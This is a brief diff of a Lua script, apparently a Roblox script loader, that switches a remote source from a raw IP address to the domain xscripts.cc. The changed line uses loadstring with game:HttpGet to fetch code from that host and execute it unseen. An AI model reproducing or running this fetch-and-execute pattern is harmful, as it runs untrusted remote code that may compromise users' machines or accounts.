@@ -21,5 +21,5 @@ wait(3)
 
 -- Script 3
 task.spawn(function()
-    loadstring(game:HttpGet("http://31.172.87.116/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
+    loadstring(game:HttpGet("https://xscripts.cc/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
 end)
